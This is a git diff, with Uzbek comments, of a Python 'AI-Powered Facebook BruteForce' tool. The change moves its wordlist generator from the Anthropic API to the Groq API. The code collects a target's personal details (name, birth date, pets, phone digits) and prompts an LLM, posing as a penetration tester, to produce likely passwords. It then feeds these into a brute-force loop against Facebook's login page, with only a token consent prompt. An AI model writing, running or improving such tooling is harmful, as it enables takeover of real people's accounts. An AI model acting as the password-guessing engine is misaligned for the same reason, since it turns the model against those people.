@@ -35,10 +35,10 @@ class C:
 # ─────────────────────────────────────────
 #  ORIGINAL CONFIG (o'zgarishsiz)
 # ─────────────────────────────────────────
-PASSWORD_FILE     = "passwords.txt"
+PASSWORD_FILE       = "passwords.txt"
 MIN_PASSWORD_LENGTH = 6
-POST_URL          = 'https://www.facebook.com/login.php'
-HEADERS           = {
+POST_URL            = 'https://www.facebook.com/login.php'
+HEADERS             = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                   '(KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
 }
@@ -46,12 +46,12 @@ PAYLOAD = {}
 COOKIES = {}
 
 # ─────────────────────────────────────────
-#  API KEY MANAGER
+#  API KEY MANAGER (Groq)
 # ─────────────────────────────────────────
 CONFIG_DIR  = Path.home() / ".config" / "fb_ai_bf"
 CONFIG_FILE = CONFIG_DIR / "config.json"
 
-def load_api_key() -> str | None:
+def load_api_key():
     if CONFIG_FILE.exists():
         try:
             with open(CONFIG_FILE) as f:
@@ -67,14 +67,14 @@ def save_api_key(key: str):
     CONFIG_FILE.chmod(0o600)
 
 def validate_api_key(key: str) -> bool:
-    """Anthropic API ga oddiy so'rov yuborib tekshiradi."""
+    """Groq API ga oddiy so'rov yuborib tekshiradi."""
     try:
-        import anthropic
-        client = anthropic.Anthropic(api_key=key)
-        client.messages.create(
-            model="claude-haiku-4-5-20251001",
-            max_tokens=5,
-            messages=[{"role": "user", "content": "hi"}]
+        from groq import Groq
+        client = Groq(api_key=key)
+        client.chat.completions.create(
+            model="llama3-8b-8192",
+            messages=[{"role": "user", "content": "hi"}],
+            max_tokens=5
         )
         return True
     except Exception:
@@ -82,7 +82,7 @@ def validate_api_key(key: str) -> bool:
 
 def get_api_key() -> str:
     # 1. Env variable
-    env = os.environ.get("ANTHROPIC_API_KEY", "").strip()
+    env = os.environ.get("GROQ_API_KEY", "").strip()
     if env:
         print(f"{C.DIM}[key] Env variable dan olindi.{C.RESET}")
         return env
@@ -95,12 +95,13 @@ def get_api_key() -> str:
 
     # 3. Foydalanuvchidan so'rash
     print(f"""
-{C.CYAN}═══ Anthropic API Key ═══{C.RESET}
+{C.CYAN}═══ Groq API Key ═══{C.RESET}
   AI wordlist yaratish uchun kerak.
-  Bepul key: {C.YELLOW}https://console.anthropic.com/settings/keys{C.RESET}
+  {C.BOLD}BEPUL{C.RESET} key olish: {C.YELLOW}https://console.groq.com/keys{C.RESET}
+  (Ro'yxatdan o'tib, "Create API Key" tugmasini bos)
 """)
     while True:
-        key = input("  API Key (sk-ant-...): ").strip()
+        key = input("  API Key (gsk_...): ").strip()
         if not key:
             print(f"  {C.RED}Bo'sh bo'lishi mumkin emas.{C.RESET}")
             continue
@@ -118,23 +119,19 @@ def get_api_key() -> str:
         return key
 
 # ─────────────────────────────────────────
-#  AI WORDLIST GENERATOR
+#  AI WORDLIST GENERATOR (Groq - Bepul)
 # ─────────────────────────────────────────
 def generate_ai_wordlist(api_key: str, target_info: dict, count: int = 50) -> list:
-    """
-    Claude API orqali target haqidagi ma'lumotdan
-    aqlli parollar ro'yxatini yaratadi.
-    """
     try:
-        import anthropic
+        from groq import Groq
     except ImportError:
-        print(f"{C.RED}[!] 'anthropic' kutubxonasi topilmadi.{C.RESET}")
-        print(f"    pip install anthropic")
+        print(f"{C.RED}[!] 'groq' kutubxonasi topilmadi.{C.RESET}")
+        print(f"    pip install groq")
         return []
 
     print(f"\n{C.CYAN}[AI]{C.RESET} {count} ta parol generatsiya qilinmoqda...")
 
-    client = anthropic.Anthropic(api_key=api_key)
+    client = Groq(api_key=api_key)
 
     prompt = f"""Sen penetration testing mutaxassisiisan.
 Quyidagi target haqidagi ma'lumot asosida {count} ta potentsial Facebook parol yarat.
@@ -150,13 +147,13 @@ Qoidalar:
 - Izoh, raqam, nuqta YOZMA — faqat parollar
 """
 
-    msg = client.messages.create(
-        model="claude-sonnet-4-20250514",
-        max_tokens=1000,
-        messages=[{"role": "user", "content": prompt}]
+    response = client.chat.completions.create(
+        model="llama3-8b-8192",
+        messages=[{"role": "user", "content": prompt}],
+        max_tokens=1000
     )
 
-    raw = msg.content[0].text.strip()
+    raw   = response.choices[0].message.content.strip()
     words = [l.strip() for l in raw.splitlines()
              if l.strip() and len(l.strip()) >= MIN_PASSWORD_LENGTH]
 
@@ -164,33 +161,30 @@ Qoidalar:
     return words
 
 def get_target_info() -> dict:
-    """Target haqida ma'lumot to'plash."""
     print(f"\n{C.CYAN}═══ Target ma'lumotlari (AI uchun) ═══{C.RESET}")
     info = {}
-    info["first_name"]    = input("  Ism: ").strip()
-    info["last_name"]     = input("  Familiya: ").strip()
-    info["birth_year"]    = input("  Tug'ilgan yil (ixtiyoriy): ").strip()
-    info["birth_date"]    = input("  Tug'ilgan kun/oy (masalan 1504, ixtiyoriy): ").strip()
-    info["nickname"]      = input("  Laqab/username (ixtiyoriy): ").strip()
-    info["pet_or_hobby"]  = input("  Sevimli narsa/hayvon/hobby (ixtiyoriy): ").strip()
-    info["phone_last4"]   = input("  Telefon oxirgi 4 raqam (ixtiyoriy): ").strip()
+    info["first_name"]   = input("  Ism: ").strip()
+    info["last_name"]    = input("  Familiya: ").strip()
+    info["birth_year"]   = input("  Tug'ilgan yil (ixtiyoriy): ").strip()
+    info["birth_date"]   = input("  Tug'ilgan kun/oy (masalan 1504, ixtiyoriy): ").strip()
+    info["nickname"]     = input("  Laqab/username (ixtiyoriy): ").strip()
+    info["pet_or_hobby"] = input("  Sevimli narsa/hayvon/hobby (ixtiyoriy): ").strip()
+    info["phone_last4"]  = input("  Telefon oxirgi 4 raqam (ixtiyoriy): ").strip()
     extra = input("  Boshqa ma'lumot (ixtiyoriy): ").strip()
     if extra:
         info["extra"] = extra
     return {k: v for k, v in info.items() if v}
 
 def merge_wordlists(ai_words: list, file_words: list) -> list:
-    """AI va fayl wordlistlarini birlashtiradi, takrorlarni olib tashlaydi."""
-    combined = list(dict.fromkeys(ai_words + file_words))  # order saqlanadi
-    return combined
+    return list(dict.fromkeys(ai_words + file_words))
 
 # ─────────────────────────────────────────
 #  ORIGINAL BRUTE FORCE (o'zgarishsiz)
 # ─────────────────────────────────────────
 def create_form():
-    form = dict()
+    form    = dict()
     cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
-    data = requests.get(POST_URL, headers=HEADERS)
+    data    = requests.get(POST_URL, headers=HEADERS)
     for i in data.cookies:
         cookies[i.name] = i.value
     data = BeautifulSoup(data.text, 'html.parser').form
@@ -217,8 +211,6 @@ def is_this_a_password(email, index, password):
 # ─────────────────────────────────────────
 def main():
     clear()
-
-    # Banner
     print(f"""{C.CYAN}{C.BOLD}
   ╔══════════════════════════════════════════════╗
   ║   AI-Powered Facebook BruteForce  v2.0      ║
@@ -227,16 +219,15 @@ def main():
 {C.RESET}""")
 
     print(f"""{C.YELLOW}⚠  OGOHLANTIRISH:{C.RESET} Faqat {C.BOLD}o'z akkauntingizni{C.RESET} yoki {C.BOLD}ruxsat berilgan{C.RESET} akkauntlarni test qiling!
-   Ruxsatsiz ishlatish {C.RED}noqonuniy{C.RESET} va jinoyiy javobgarlikka olib keladi.\n""")
+   Ruxsatsiz ishlatish {C.RED}noqonuniy{C.RESET}.\n""")
 
     confirm = input("  Davom etishga rozimisiz? (ha/yo'q): ").strip().lower()
     if confirm not in ["ha", "yes", "y"]:
         sys.exit(0)
 
-    # Wordlist rejimi
     print(f"\n{C.CYAN}═══ Wordlist rejimi ═══{C.RESET}")
-    print("  1. AI yaratsin (target ma'lumot asosida)")
-    print("  2. passwords.txt fayldan o'qi (original rejim)")
+    print("  1. AI yaratsin (Groq - BEPUL)")
+    print("  2. passwords.txt fayldan o'qi")
     print("  3. Ikkalasi — AI + passwords.txt (tavsiya)")
     mode = input("\n  Rejim [1/2/3]: ").strip()
 
@@ -245,8 +236,8 @@ def main():
     if mode in ["1", "3"]:
         api_key     = get_api_key()
         target_info = get_target_info()
-        count = int(input(f"\n  Nechta AI parol? [{C.DIM}50{C.RESET}]: ").strip() or "50")
-        ai_words = generate_ai_wordlist(api_key, target_info, count)
+        count       = int(input(f"\n  Nechta AI parol? [50]: ").strip() or "50")
+        ai_words    = generate_ai_wordlist(api_key, target_info, count)
         password_list.extend(ai_words)
 
     if mode in ["2", "3"]:
@@ -255,22 +246,20 @@ def main():
             if mode == "2":
                 sys.exit(0)
         else:
-            file_words = open(PASSWORD_FILE, 'r').read().split("\n")
-            file_words = [p.strip() for p in file_words
-                          if p.strip() and len(p.strip()) >= MIN_PASSWORD_LENGTH]
+            file_words    = open(PASSWORD_FILE, 'r').read().split("\n")
+            file_words    = [p.strip() for p in file_words
+                             if p.strip() and len(p.strip()) >= MIN_PASSWORD_LENGTH]
             print(f"{C.GREEN}[+]{C.RESET} passwords.txt: {len(file_words)} ta parol o'qildi.")
             password_list = merge_wordlists(password_list, file_words)
 
     if not password_list:
-        print(f"{C.RED}[!]{C.RESET} Parol ro'yxati bo'sh. Chiqildi.")
+        print(f"{C.RED}[!]{C.RESET} Parol ro'yxati bo'sh.")
         sys.exit(0)
 
     print(f"\n{C.CYAN}[*]{C.RESET} Jami {C.BOLD}{len(password_list)}{C.RESET} ta parol sinab ko'riladi.\n")
 
-    # Target email
     email = input(f'\t{C.CYAN}Email/Username ➤{C.RESET} ').strip()
 
-    # ── Original brute force logika (o'zgarishsiz) ──
     for index, password in enumerate(password_list):
         if len(password) < MIN_PASSWORD_LENGTH:
             continue
